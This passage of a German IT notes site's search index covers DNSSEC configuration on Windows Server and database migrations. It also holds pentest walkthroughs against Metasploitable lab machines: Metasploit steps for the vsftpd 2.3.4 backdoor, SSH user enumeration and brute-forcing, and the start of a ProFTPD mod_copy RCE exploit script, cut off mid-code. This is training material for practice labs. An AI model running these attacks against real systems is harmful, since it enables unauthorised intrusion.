ist.</p> <p></p> <p></p> <p></p> <p>In der Benutzeroberfl\u00e4che des Gruppenrichtlinienverwaltungs-Editors \u00f6ffnen Sie unter \"Computer Configuration\" die Option \"Policies\", dann \"Windows Settings\" und klicken schlie\u00dflich auf \"Name Resolution\".</p> <p>Im rechten Bereich, unter \"Regeln erstellen\", geben Sie in das Suffix-Feld \"main.corp.fenaco.com\" ein, um die Regel auf das Suffix des Namensraums anzuwenden.</p> <p>Aktivieren Sie sowohl das Kontrollk\u00e4stchen \"DNSSEC in dieser Regel aktivieren\" als auch das Kontrollk\u00e4stchen \"DNS-Clients dazu verpflichten, zu \u00fcberpr\u00fcfen, ob die Namen- und Adressdaten vom DNS-Server validiert wurden\". Klicken Sie anschlie\u00dfend auf \"Erstellen\".</p> <p>Mit der oben genannten Vorgehensweise wird die Namensaufl\u00f6sungsrichtlinie f\u00fcr den Computer konfiguriert. Durch die Hinzuf\u00fcgung des Suffixes \"main.corp.fenaco.com\" wird die Regel auf den Namensraum dieses Suffixes angewendet. Die Aktivierung der DNSSEC-Funktion in der Regel stellt sicher, dass DNS-Daten mit digitalen Signaturen versehen und somit vor Manipulation gesch\u00fctzt sind. Durch die \u00dcberpr\u00fcfung der Namen- und Adressdaten durch den DNS-Server wird die Integrit\u00e4t und Authentizit\u00e4t der Daten gew\u00e4hrleistet.</p> <p></p> <pre><code>Resolve-DnsName main.corp.fenaco.com -Server fensrv092111 -dnssecok\n</code></pre> <p></p>"},{"location":"Privat/DNS/DNSSEC/dnssec-windows-server-oeffentlich/","title":"DNSSEC auf Windows DNS einrichten (\u00d6ffentlich)","text":""},{"location":"Privat/DNS/DNSSEC/dnssec-windows-server-oeffentlich/#dnssec-status-kontrollieren","title":"DNSSEC Status Kontrollieren","text":"<p>Als erstest kontrolliert man den DNSSEC stand mit den folgenden 2 Seiten.</p> <p>https://dnssec-analyzer.verisignlabs.com/</p> <p></p> <p>Wie man im Oberen Bild sehen kann ist DNSSEC f\u00fcr die Domain .ch m\u00f6glich aber wurde noch nicht konfiguriert f\u00fcr die Domain fenacotest.ch</p> <p>https://dnsviz.net/d/fenacotest.ch/dnssec/</p> <p></p> <p>Hier w\u00fcrde man als Bild sehen dass kein DNSSEC konfiguriert wurde.</p>"},{"location":"Privat/DNS/DNSSEC/dnssec-windows-server-oeffentlich/#dnssec-auf-windows-server-konfigurieren","title":"DNSSEC auf Windows Server konfigurieren","text":"<p>Im DNS-Manager navigieren Sie zu Ihrem Dom\u00e4nennamen. Klicken Sie mit der rechten Maustaste auf den Dom\u00e4nennamen und w\u00e4hlen Sie \"DNSSEC\" aus. Anschlie\u00dfend klicken Sie auf \"Zone signieren\".</p> <p></p> <p>Im Interface des Zone Signing Wizard klicken Sie auf \"Weiter\".</p> <p></p> <p>Im Interface f\u00fcr die Signierungsoptionen klicken Sie auf \"Customize zone signing parameters\" und anschlie\u00dfend auf \"Weiter\".</p> <p>Durch die Auswahl von \"Customize zone signing parameters\" haben Sie die M\u00f6glichkeit, die Signierungseinstellungen f\u00fcr Ihre Zone individuell anzupassen. Dies erm\u00f6glicht Ihnen eine feinere Kontrolle \u00fcber den Signierungsprozess und die Sicherheit Ihrer DNS-Zone.</p> <p>Alternativ dazu k\u00f6nnen Sie auch andere Optionen in Betracht ziehen, wie z.B. \"Use default settings to sign the zone\", bei dem vorgegebene Signierungseinstellungen automatisch angewendet werden. Diese Option ist empfehlenswert, wenn Sie sich nicht mit den detaillierten Parametern der Signierung befassen m\u00f6chten und eine einfache, standardisierte Konfiguration bevorzugen.</p> <p>Durch die Auswahl der Option \"Sign the zone with parameters of an existing zone\" k\u00f6nnen Sie die bereits konfigurierten Signaturparameter einer anderen Zone \u00fcbernehmen und f\u00fcr die Signierung Ihrer aktuellen Zone verwenden. Dies kann n\u00fctzlich sein, wenn Sie bereits eine Zone mit den gew\u00fcnschten Signaturparametern haben und diese f\u00fcr die neue Zone wiederverwenden m\u00f6chten, anstatt die Parameter manuell anzupassen.</p> <p></p> <p>Als Keymaster-Server sollte ein dedizierter und hochsicherer Server verwendet werden. Idealerweise sollte der Keymaster-Server nicht derselbe Server sein, der auch f\u00fcr die DNS-Infrastruktur oder andere kritische Dienste verwendet wird. Dadurch wird das Risiko einer Kompromittierung der Schl\u00fcssel reduziert.</p> <p>Die Hauptfunktionen eines Keymaster-Servers:</p> <p>Schl\u00fcsselgenerierung: Der Keymaster-Server erzeugt neue kryptografische Schl\u00fcssel nach den gew\u00fcnschten Standards und Algorithmen.</p> <p>Schl\u00fcsselspeicherung: Der Keymaster-Server verwaltet den sicheren Speicher der erzeugten Schl\u00fcssel. Dies kann entweder in einer speziellen Hardwarekomponente wie einem Hardware Security Module (HSM) oder in verschl\u00fcsselten Software-Tresoren erfolgen.</p> <p></p> <p>Der KSK (Key Signing Key) ist ein spezieller kryptografischer Schl\u00fcssel, der f\u00fcr das Signieren von Zonenschl\u00fcsseln in DNSSEC verwendet wird. Er dient dazu, die Vertrauenskette im DNSSEC-System zu etablieren und sicherzustellen, dass die signierten Zonenschl\u00fcssel g\u00fcltig und vertrauensw\u00fcrdig sind. Der KSK ist eine wichtige Komponente f\u00fcr die Sicherheit und Integrit\u00e4t des Domain Name Systems.</p> <p></p> <p></p> <p>Cryptographic algorithm = Es gibt verschiedene Algorithmen wie RSA, DSA oder ECDSA.</p> <p>Key length (Bits) = Die Schl\u00fcssell\u00e4nge gibt an, wie lang der KSK in Bits ist. Eine l\u00e4ngere Schl\u00fcssell\u00e4nge bietet normalerweise eine h\u00f6here Sicherheit, aber auch eine gr\u00f6\u00dfere Berechnungs- und Verarbeitungszeit. Die empfohlene Schl\u00fcssell\u00e4nge f\u00fcr den KSK kann von den Standards und Best Practices der jeweiligen DNSSEC-Implementierung abh\u00e4ngen. In der Regel sind Schl\u00fcssell\u00e4ngen von 2048 Bits oder h\u00f6her angemessen.</p> <p>Select a key storage provider to generate and store keys = Bei der Auswahl eines Key Storage Providers geht es darum, einen sicheren Speicherort f\u00fcr den KSK zu w\u00e4hlen. Dies kann ein Hardware Security Module (HSM), ein spezielles Sicherheitsger\u00e4t oder ein verschl\u00fcsselter Software-Tresor sein. Die Wahl des Anbieters h\u00e4ngt von den Sicherheitsanforderungen, der Skalierbarkeit und den verf\u00fcgbaren Optionen ab.</p> <p>DNSKEY RRSET signature validity period (hours) = Die G\u00fcltigkeitsdauer der DNSKEY RRSET-Signatur gibt an, wie lange die Signatur f\u00fcr den KSK g\u00fcltig ist, bevor sie erneuert oder aktualisiert werden muss. Eine l\u00e4ngere G\u00fcltigkeitsdauer reduziert die Notwendigkeit h\u00e4ufiger Signaturaktualisierungen, erh\u00f6ht jedoch auch das Risiko bei Kompromittierung des Schl\u00fcssels.</p> <p>Enable automatic rollover = Die automatische Rollover-Funktion erm\u00f6glicht die automatische Aktualisierung und Erneuerung des KSKs nach einer bestimmten Zeit oder nach festgelegten Ereignissen. Dies gew\u00e4hrleistet eine kontinuierliche Sicherheit und Schl\u00fcsselaktualisierung, um m\u00f6gliche Sicherheitsrisiken zu minimieren. Die Aktivierung der automatischen Rollover-Funktion wird empfohlen, um den KSK regelm\u00e4\u00dfig zu erneuern und sicherzustellen, dass er immer auf dem aktuellen Stand ist.</p> <p></p> <p></p> <p>ZSK steht f\u00fcr \"Zone Signing Key\" und ist ein kryptografischer Schl\u00fcssel, der zur Signierung von DNS-Zonen verwendet wird. Er dient dazu, die Integrit\u00e4t und Authentizit\u00e4t von DNS-Daten sicherzustellen. Der ZSK wird normalerweise regelm\u00e4\u00dfig gewechselt, um die Sicherheit der Signierung zu gew\u00e4hrleisten.</p> <p>Der Hauptunterschied zwischen ZSK und KSK besteht darin, dass ZSKs verwendet werden, um DNS-Zonen zu signieren, w\u00e4hrend KSKs verwendet werden, um die ZSKs selbst zu signieren. KSKs haben eine l\u00e4ngere Lebensdauer und dienen dazu, die Vertrauenskette im DNSSEC-System zu etablieren und zu erhalten, w\u00e4hrend ZSKs h\u00e4ufiger gewechselt werden, um die Sicherheit der Signierung zu gew\u00e4hrleisten. Zusammen arbeiten ZSKs und KSKs, um die Integrit\u00e4t und Authentizit\u00e4t von DNS-Daten sicherzustellen und eine sichere Kommunikation im DNSSEC-System zu erm\u00f6glichen.</p> <p></p> <p></p> <p>Cryptographic algorithm = Es gibt verschiedene Algorithmen wie RSA, DSA oder ECDSA.</p> <p>Key length (Bits) = Die Schl\u00fcssell\u00e4nge gibt an, wie lang der KSK in Bits ist. Eine l\u00e4ngere Schl\u00fcssell\u00e4nge bietet normalerweise eine h\u00f6here Sicherheit, aber auch eine gr\u00f6\u00dfere Berechnungs- und Verarbeitungszeit. Die empfohlene Schl\u00fcssell\u00e4nge f\u00fcr den KSK kann von den Standards und Best Practices der jeweiligen DNSSEC-Implementierung abh\u00e4ngen. In der Regel sind Schl\u00fcssell\u00e4ngen von 2048 Bits oder h\u00f6her angemessen.</p> <p>Select a key storage provider to generate and store keys = Bei der Auswahl eines Key Storage Providers geht es darum, einen sicheren Speicherort f\u00fcr den KSK zu w\u00e4hlen. Dies kann ein Hardware Security Module (HSM), ein spezielles Sicherheitsger\u00e4t oder ein verschl\u00fcsselter Software-Tresor sein. Die Wahl des Anbieters h\u00e4ngt von den Sicherheitsanforderungen, der Skalierbarkeit und den verf\u00fcgbaren Optionen ab.</p> <p>DNSKEY Signature Validity Period (hours) = Dies bezieht sich auf die G\u00fcltigkeitsdauer der digitalen Signatur f\u00fcr den DNSKEY-Eintrag, der den \u00f6ffentlichen Teil des ZSK enth\u00e4lt. Es gibt an, wie lange die Signatur als g\u00fcltig betrachtet wird, bevor sie erneuert werden muss. Die empfohlene Wertebereich liegt in der Regel zwischen 24 und 48 Stunden.</p> <p>DS Signature Validity Period (hours) = Dies bezieht sich auf die G\u00fcltigkeitsdauer der digitalen Signatur f\u00fcr den DS-Eintrag, der den \u00f6ffentlichen Teil des KSK (Key Signing Key) repr\u00e4sentiert. Der DS-Eintrag wird von der \u00fcbergeordneten DNS-Zone verwendet, um den KSK des untergeordneten Bereichs zu \u00fcberpr\u00fcfen. Auch hier empfiehlt sich ein Wertebereich von 24 bis 48 Stunden.</p> <p>Zone Record Validity Period (hours) = Dies bezieht sich auf die G\u00fcltigkeitsdauer anderer DNS-Zoneneintr\u00e4ge, die von der ZSK signiert wurden. Es gibt an, wie lange diese Eintr\u00e4ge als g\u00fcltig betrachtet werden, bevor sie erneuert werden m\u00fcssen. Der empfohlene Wertebereich liegt normalerweise zwischen 24 und 72 Stunden, abh\u00e4ngig von den spezifischen Anforderungen des Systems und der beabsichtigten Aktualisierungsfrequenz.</p> <p></p> <p></p> <p>NSEC = (Next Secure) ist eine Methode, bei der ein spezieller DNS-Datensatz verwendet wird, um die Existenz einer DNS-Ressource zu best\u00e4tigen und gleichzeitig L\u00fccken in der Namensraumabdeckung offenzulegen. NSEC-Eintr\u00e4ge werden in einer sortierten Reihenfolge pr\u00e4sentiert und erm\u00f6glichen es DNS-Clients, effizient zu \u00fcberpr\u00fcfen, ob eine bestimmte DNS-Ressource existiert oder nicht. NSEC hat jedoch den Nachteil, dass es Informationen \u00fcber die vorhandenen DNS-Ressourcen preisgibt.</p> <p>NSEC3 ist eine Weiterentwicklung von NSEC, die entwickelt wurde, um die Offenlegung von Informationen in NSEC zu reduzieren. Bei NSEC3 werden die DNS-Namen mit einem kryptografischen Hash-Algorithmus und einem sogenannten Salz (Salt) verschl\u00fcsselt, um die L\u00fccken in der Namensraumabdeckung zu verbergen. Durch die Verwendung von NSEC3 k\u00f6nnen DNS-Clients immer noch \u00fcberpr\u00fcfen, ob eine bestimmte DNS-Ressource existiert, ohne dass alle vorhandenen DNS-Namen offengelegt werden.</p> <p>Iterations = Die Anzahl der Iterationen bestimmt die Anzahl der Hash-Berechnungen, die bei der Verwendung von NSEC3 durchgef\u00fchrt werden. Eine h\u00f6here Anzahl von Iterationen erh\u00f6ht die Sicherheit, kann jedoch auch die Leistung beeintr\u00e4chtigen. Ein guter Kompromiss ist normalerweise eine ausreichende Anzahl von Iterationen, um Brute-Force-Angriffe zu erschweren, ohne die Leistung signifikant zu beeintr\u00e4chtigen.</p> <p>Generate and use a random salt of length = Das Salz (Salt) ist eine zuf\u00e4llige Zeichenfolge, die zusammen mit dem DNS-Namen verwendet wird, um die Hash-Werte in NSEC3 zu berechnen. Die L\u00e4nge des Salzes kann variieren und sollte ausreichend sein, um Kollisionen zu vermeiden. Ein zuf\u00e4lliges und langes Salz erh\u00f6ht die Sicherheit des Systems.</p> <p>Use opt-out to cover unsigned delegations = Opt-out erm\u00f6glicht es, dass NSEC3-Eintr\u00e4ge f\u00fcr nicht signierte Subdom\u00e4nen automatisch generiert werden. Dies kann die Gr\u00f6\u00dfe der DNSSEC-Daten reduzieren und die Effizienz verbessern. Allerdings sollten die Auswirkungen auf die Sicherheit und die Kompatibilit\u00e4t mit DNS-Clients sorgf\u00e4ltig abgewogen werden.</p> <p></p> <p>\"Enable the distribution of trust anchors for this zone\" = Durch das Aktivieren dieser Option erm\u00f6glichen Sie die Verteilung der Trust-Anchors f\u00fcr Ihre DNS-Zone an andere DNS-Resolver. Trust-Anchors sind \u00f6ffentliche Schl\u00fcssel, die von Resolvern verwendet werden, um die DNSSEC-Signaturen in Ihrer Zone zu \u00fcberpr\u00fcfen. Die Verteilung der Trust-Anchors erleichtert die \u00dcberpr\u00fcfung der DNSSEC-Authentizit\u00e4t durch andere Systeme, die Ihre Zone abfragen.</p> <p>\"Enable automatic update of trust anchors on key rollover (RFC 5011)\" = Wenn Sie diese Option aktivieren, erlauben Sie die automatische Aktualisierung der Trust-Anchors bei einem Schl\u00fcsselwechsel (Key Rollover). RFC 5011 ist ein Standard, der beschreibt, wie DNSSEC-Resolver automatisch aktualisierte Trust-Anchors empfangen und akzeptieren k\u00f6nnen, ohne dass eine manuelle Intervention erforderlich ist. Diese Option gew\u00e4hrleistet, dass Resolver immer die aktuellen und g\u00fcltigen Trust-Anchors verwenden, wenn sich die Schl\u00fcssel in Ihrer DNS-Zone \u00e4ndern.</p> <p></p> <p>DS record generation algorithm = Dies bezieht sich auf den Algorithmus, der verwendet wird, um den DS (Delegation Signer) Record zu generieren. Der DS Record enth\u00e4lt den \u00f6ffentlichen Teil des Key Signing Key (KSK) und wird in der \u00fcbergeordneten DNS-Zone verwendet, um die DNSSEC-Validierung der untergeordneten Zone zu erm\u00f6glichen. Der Algorithmus bestimmt, wie der DS Record aus dem KSK generiert wird und kann beispielsweise RSA, DSA oder ECDSA sein.</p> <p>DS record TTL = TTL steht f\u00fcr \"Time-to-Live\" und gibt an, wie lange der DS Record im Cache der DNS-Resolver g\u00fcltig bleibt, bevor er erneut abgefragt werden muss. Ein niedriger TTL-Wert bedeutet, dass der DS Record h\u00e4ufiger aktualisiert und abgefragt wird, w\u00e4hrend ein h\u00f6herer TTL-Wert die Caching-Zeit verl\u00e4ngert und die Anzahl der Abfragen reduziert.</p> <p>DNSKEY record TTL = \u00c4hnlich wie der DS Record TTL gibt der DNSKEY Record TTL an, wie lange der DNSKEY Record, der den \u00f6ffentlichen Teil des Zone Signing Key (ZSK) enth\u00e4lt, im Cache der DNS-Resolver g\u00fcltig bleibt, bevor er erneut abgefragt werden muss. Auch hier beeinflusst der TTL-Wert die Caching-Zeit und die H\u00e4ufigkeit der Abfragen f\u00fcr den DNSKEY Record.</p> <p>Signature inception = Dies bezieht sich auf den Zeitpunkt, an dem die digitale Signatur f\u00fcr die DNS-Ressourcenaufzeichnungen (wie A-, MX- oder CNAME-Eintr\u00e4ge) in einer DNS-Zone erstellt wird. Die Signature Inception gibt an, ab wann die Signaturen als g\u00fcltig betrachtet werden und f\u00fcr die Validierung der DNSSEC-Antworten verwendet werden k\u00f6nnen. Die Signature Inception ist normalerweise ein Zeitpunkt in der Zukunft, um sicherzustellen, dass alle DNS-Resolver die neuen Signaturen erhalten, bevor sie verwendet werden m\u00fcssen.</p> <p></p> <p></p>"},{"location":"Privat/DNS/DNSSEC/dnssec-windows-server-oeffentlich/#ds-eintrag-erstellen-und-am-registrator-geben","title":"DS Eintrag erstellen und am Registrator geben","text":"<p>Wenn man das obere konfiguriert hat, kann man zum \u00fcberpr\u00fcfen und zum herausfinden welches der oberste DNSKEY ist wieder auf den folgenden link gehen:</p> <p>https://dnsviz.net/d/fenacotest.ch/dnssec/</p> <p></p> <p>Wie man im oberen sieht sind jetzt 4 DNSKEYs dazu gekommen. 2 wurden vom KSK ausgesstellt und die anderen 2 vom ZSK. Wir merken uns den obersten also id=6076</p> <p>Danach um den DS Wert herauszufinden gibt es mehrere wege aber da keiner davon bei mir funktioniert hat habe ich mir kurz einen Docker Webserver gemacht der mir die DS informationen generiert.</p> <p>Image selber Builden: Github: https://github.com/masluse/DNSKEY-to-DS</p> <p>Docker Befehl: <pre><code>docker run -p 5000:5000 masluse/dnskey-to-ds-converter:latest\n</code></pre></p> <p>Danach kann man \u00fcber den Browser auf die adresse http://localhost:5000</p> <p></p> <p>Dort kommen jetzt 2 eintr\u00e4ge. Wir brauchen aber nur den mit der ID die wir uns vorher gemerkt haben also ID / Key Tag = 6076</p> <p>Wenn man das gemacht hat geht man zum Domain Registrator, sucht wo man DS records eintragen kann und gibt alle n\u00f6tigen informationen ein.</p> <p></p> <p>Es kann danach je nach anbieter bis zu 1 Stunde dauern bis dieser eintrag von den TLD Servern genommen wird. Danach kann man nochmal auf https://dnssec-analyzer.verisignlabs.com/ und auf https://dnsviz.net/d/fenacotest.ch/dnssec/</p> <p></p> <p></p>"},{"location":"Privat/Datenbanken/Migration-MariaDB/","title":"MariaDB Migration","text":""},{"location":"Privat/Datenbanken/Migration-MariaDB/#schritt-1-vorbereitung","title":"Schritt 1: Vorbereitung","text":"<p>Notieren Sie sich die Zugangsdaten (Benutzername, Passwort) und Konfigurationsdetails Ihrer aktuellen MariaDB-Instanz auf EC2.</p>"},{"location":"Privat/Datenbanken/Migration-MariaDB/#schritt-2-rds-db-erstellen","title":"Schritt 2: RDS DB Erstellen","text":"<p>Erstellen Sie eine RDS-Instanz</p> <p>a. Melden Sie sich bei der AWS Management Console an und navigieren Sie zum RDS-Dashboard.</p> <p>b. Klicken Sie auf \"Datenbank erstellen\" und w\u00e4hlen Sie \"MariaDB\" als Datenbank-Engine aus.</p> <p></p> <p>c. Konfigurieren Sie die RDS-Instanz gem\u00e4\u00df Ihren Anforderungen (DB-Instanzklasse, Speicher, Multi-AZ-Bereitstellung usw.).</p> <p></p> <p></p> <p>d. Geben Sie die Zugangsdaten und den Datenbanknamen an, die Sie in Schritt 1b notiert haben.</p> <p></p> <p>e. Whlen Sie die richtige VPC und Sicherheitsgruppe, um die Kommunikation zwischen Ihrer EC2-Instanz und der RDS-Instanz zu erm\u00f6glichen.</p> <p></p> <p>f. Klicken Sie auf \"Datenbank erstellen\" und warten Sie, bis der Vorgang abgeschlossen ist.</p> <p></p>"},{"location":"Privat/Datenbanken/Migration-MariaDB/#schritt-3-dump-erstellen","title":"Schritt 3: Dump Erstellen","text":"<p>Erstellen Sie einen Datenbank-Dump von Ihrer EC2-Instanz</p> <p>a. Melden Sie sich bei Ihrer EC2-Instanz \u00fcber SSH an.</p> <p></p> <p>b. Stellen Sie sicher, dass der mysqldump-Befehl installiert ist.</p> <p></p> <p>c. F\u00fchren Sie den folgenden Befehl aus, um einen Datenbank-Dump zu erstellen:</p> <pre><code>mysqldump -u [BENUTZERNAME] -p --databases [DATENBANKNAME] --single-transaction --compress --order-by-primary &gt; backup.sql\n</code></pre> <p>Ersetzen Sie [BENUTZERNAME] und [DATENBANKNAME] durch die entsprechenden Werte.</p> <p></p>"},{"location":"Privat/Datenbanken/Migration-MariaDB/#schritt-4-dump-importieren","title":"Schritt 4: Dump Importieren","text":"<p>Importieren Sie den Datenbank-Dump in Ihre RDS-Instanz</p> <p>a. Notieren Sie sich die Endpunkt-URL Ihrer RDS-Instanz aus dem RDS-Dashboard.</p> <p></p> <p>b. F\u00fchren Sie den folgenden Befehl aus, um den Datenbank-Dump in die RDS-Instanz zu importieren:</p> <pre><code>mysql -h [RDS-ENDPUNKT] -u [BENUTZERNAME] -p [DATENBANKNAME] &lt; backup.sql\n</code></pre> <p>Ersetzen Sie [RDS-ENDPUNKT], [BENUTZERNAME] und [DATENBANKNAME] durch die entsprechenden Werte.</p> <p></p>"},{"location":"Privat/Datenbanken/Migration-MariaDB/#schritt-5-aktualisieren","title":"Schritt 5: Aktualisieren","text":"<p>Aktualisieren Sie Ihre Anwendung, um die RDS-Instanz zu verwenden</p> <p>a. Aktualisieren Sie die Datenbankverbindungsparameter in Ihrer Anwendung, um auf die RDS-Instanz zu verweisen.</p> <p>b. Starten Sie Ihre Anwendung neu, um die \u00c4nderungen zu \u00fcbernehmen.</p>"},{"location":"Privat/Datenbanken/Migration-MariaDB/#schritt-6-testen","title":"Schritt 6: Testen","text":"<p>Testen und \u00fcberwachen Sie Ihre Anwendung</p>"},{"location":"Privat/Datenbanken/mssql-migration/","title":"MSSQL Migration","text":""},{"location":"Privat/Datenbanken/mssql-migration/#full-backup-erstellen","title":"Full-Backup erstellen","text":"<p>Um eim Full-Backup zu erstellen von der TestDB auf der MSSQL 2017 kann man den folgenden Schritten folgen:</p> <p></p> <p>Rechtsklicken Tasks/Sichern...</p> <p></p> <p>Entweder default Backup Pfad beibehalten oder wie folgt \u00e4ndern:</p> <p></p> <p></p> <p>Nachdem man den richtigen Pfad ausgew\u00e4hlt hat kann man auf ok dr\u00fccken. Nach einer gewissen zeit sollte die folgende Nachricht kommen:</p> <p></p>"},{"location":"Privat/Datenbanken/mssql-migration/#db-restoren","title":"DB Restoren","text":"<p>Um die DB auf dem MSSQL 2022 wiederherzustellen kann man den folgenden Schritten folgen.</p> <p>\"Datenanken\" Rechtsklicken und auf \"Datenbank wiederherstellen...\" dr\u00fccken:</p> <p></p> <p>.bak file ausw\u00e4hlen:</p> <p></p> <p>Kontrollieren ob alles stimmt und dann auf OK:</p> <p></p> <p>Schlussendlich sollte folgende Nachricht angezeigt werden:</p> <p></p>"},{"location":"Privat/Datenbanken/mssql-migration/#kontrollieren-ob-es-erfolgreich-war","title":"Kontrollieren ob es erfolgreich war:","text":"<p>Um zu kontrollieren ob das migrieren der DB erfolgreich war kann man den Inthalt der test Tabelle kontrollieren:</p> <p>Auf MSSQL 2022 kontrollieren:</p> <p></p> <p>Auf MSSQL 2017 kontrollieren:</p> <p></p>"},{"location":"Privat/Metaspolitable%202/FTP/","title":"FTP","text":""},{"location":"Privat/Metaspolitable%202/FTP/#nmap-scan","title":"Nmap-Scan","text":"<p>Als erstes sollte ein Nmap-Scan durchgef\u00fchrt werden, um zu sehen, ob der Metasploitable 2 Server FTP hat:</p> <pre><code>nmap -sV -sC &lt;IP-Adresse&gt;\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%202/FTP/#ftp-server-verbindung","title":"FTP-Server-Verbindung","text":"<p>Um sich mit dem FTP-Server zu verbinden, kann man den folgenden Code verwenden. Man kann sich mit Anonymous ohne Passwort anmelden, wie im Nmap-Scan zu sehen ist:</p> <pre><code>ftp &lt;IP-Adresse&gt;\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%202/FTP/#bash-exploit-suche","title":"Bash-Exploit-Suche","text":"<p>Um zu kontrollieren, ob es einen Exploit gibt, kann man den folgenden Befehl ausf\u00fchren:</p> <pre><code>searchsploit vsftpd 2.3.4\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%202/FTP/#starten-der-metasploit-konsole","title":"Starten der Metasploit-Konsole","text":"<p>Wenn man einen Exploit gefunden hat, der mit Metasploit funktioniert, kann man das Metasploit-Tool verwenden, um den Exploit zu starten. Daf\u00fcr muss man zuerst die Metasploit-Konsole starten:</p> <pre><code>msfconsole\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%202/FTP/#suche-nach-dem-exploit-in-der-metasploit-konsole","title":"Suche nach dem Exploit in der Metasploit-Konsole","text":"<p>Nachdem die Konsole gestartet wurde, muss man noch einmal nach dem Exploit suchen:</p> <pre><code>search vsftpd 2.3.4\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%202/FTP/#auswahl-des-exploits","title":"Auswahl des Exploits","text":"<p>Um den Exploit auszuw\u00e4hlen, gibt man den folgenden Befehl ein (0 = die Nummer des Exploits in der Liste):</p> <pre><code>use 0\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%202/FTP/#anzeigen-von-optionen","title":"Anzeigen von Optionen","text":"<p>Mit dem folgenden Befehl kann man sich die zu konfigurierenden Optionen anzeigen lassen:</p> <pre><code>show options\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%202/FTP/#optionen-setzen","title":"Optionen setzen","text":"<p>Danach kann man mit dem folgenden Befehl die Option setzen:</p> <pre><code>set RHOSTS &lt;IP-Adresse&gt;\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%202/FTP/#starten-des-exploits","title":"Starten des Exploits","text":"<p>Zum Schluss muss man mit dem folgenden Befehl den Exploit starten:</p> <pre><code>run\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%202/SSH/","title":"SSH","text":""},{"location":"Privat/Metaspolitable%202/SSH/#files-erstellen","title":"Files erstellen","text":"<p>User und Passwort File erstellen:</p> <pre><code>cd Documents\nnano user.txt\ncp user.txt passwort.txt\nls\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%202/SSH/#starten-der-metasploit-konsole","title":"Starten der Metasploit-Konsole","text":"<p>Wenn man einen Exploit gefunden hat, der mit Metasploit funktioniert, kann man das Metasploit-Tool verwenden, um den Exploit zu starten. Daf\u00fcr muss man zuerst die Metasploit-Konsole starten:</p> <pre><code>msfconsole\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%202/SSH/#suche-nach-dem-exploit-in-der-metasploit-konsole","title":"Suche nach dem Exploit in der Metasploit-Konsole","text":"<p>Nachdem die Konsole gestartet wurde, muss man noch nach dem Exploit suchen:</p> <pre><code>search scanner/ssh/ssh\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%202/SSH/#auswahl-des-exploits","title":"Auswahl des Exploits","text":"SSH-EnumusersSSH-Login <p>Um den Exploit auszuw\u00e4hlen, gibt man den folgenden Befehl ein (0 = die Nummer des Exploits in der Liste):</p> <pre><code>use 3\n</code></pre> <p></p> <p>Um den Exploit auszuw\u00e4hlen, gibt man den folgenden Befehl ein (0 = die Nummer des Exploits in der Liste):</p> <pre><code>use 0\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%202/SSH/#anzeigen-von-optionen","title":"Anzeigen von Optionen","text":"<p>Mit dem folgenden Befehl kann man sich die zu konfigurierenden Optionen anzeigen lassen:</p> <pre><code>show options\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%202/SSH/#optionen-setzen","title":"Optionen setzen","text":"<p>Danach kann man mit dem folgenden Befehl die Option setzen:</p> <pre><code>set RHOSTS &lt;IP-Adresse&gt;\n</code></pre> <p></p> <pre><code>set USER_FILE &lt;Pfad zur User.txt&gt;\n</code></pre> <p></p> <pre><code>set CHECK_FALSE true\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%202/SSH/#starten-des-exploits","title":"Starten des Exploits","text":"<p>Zum Schluss muss man mit dem folgenden Befehl den Exploit starten:</p> <pre><code>run\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%202/SSH/#anzeigen-von-optionen_1","title":"Anzeigen von Optionen","text":"<p>Mit dem folgenden Befehl kann man sich die zu konfigurierenden Optionen anzeigen lassen:</p> <pre><code>show options\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%202/SSH/#optionen-setzen_1","title":"Optionen setzen","text":"<p>Danach kann man mit dem folgenden Befehl die Option setzen:</p> <pre><code>set PASS_FILE &lt;Pfad zur Passwort.txt&gt;\n</code></pre> <p></p> <pre><code>set USER_FILE &lt;Pfad zur User.txt&gt;\n</code></pre> <p></p> <pre><code>set RHOSTS &lt;IP-Adresse&gt;\n</code></pre> <p></p> <pre><code>set VERBOSE true\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%202/SSH/#starten-des-exploits_1","title":"Starten des Exploits","text":"<p>Zum Schluss muss man mit dem folgenden Befehl den Exploit starten:</p> <pre><code>run\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%203/Exploit_ohne_metasploit/","title":"Exploit ohne Metasploit starten","text":""},{"location":"Privat/Metaspolitable%203/Exploit_ohne_metasploit/#exploit-suchen","title":"Exploit suchen","text":"<p>Als erstes sollte man nach dem Exploit suchen f\u00fcr die Schwachstelle:</p> <pre><code>searchsploit ProFTPD 1.3.5\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%203/Exploit_ohne_metasploit/#exploit-herunterladen","title":"Exploit herunterladen","text":"<p>Nachdem man den richtigen exploit gefunden hat kann man ihn mit dem folgenden befehl herunterladen:</p> <pre><code>searchsploit -m linux/remote/49908.py\n</code></pre> <p></p>"},{"location":"Privat/Metaspolitable%203/Exploit_ohne_metasploit/#exploit-anpassen","title":"Exploit anpassen","text":"<p>Ab diesem punkt wird es anderst f\u00fcr jeden Exploit. Du musst den heruntergeladenen Exploit durchlesen und verstehen wie er funktioniert, damit man ihn so anpassen kann das er f\u00fcr dich funktioniert.</p> <pre><code>nano 49908.py\n</code></pre> 49908.py<pre><code># Exploit Title: ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)\n# Date: 25/05/2021\n# Exploit Author: Shellbr3ak\n# Version: 1.3.5 \n# Tested on: Ubuntu 16.04.6 LTS\n# CVE : CVE-2015-3306\n#!/usr/bin/env python3\nimport sys\nimport socket\nimport requests\n\ndef exploit(client, target):\n    client.connect((target,21)) # Connecting to the target server\nbanner = 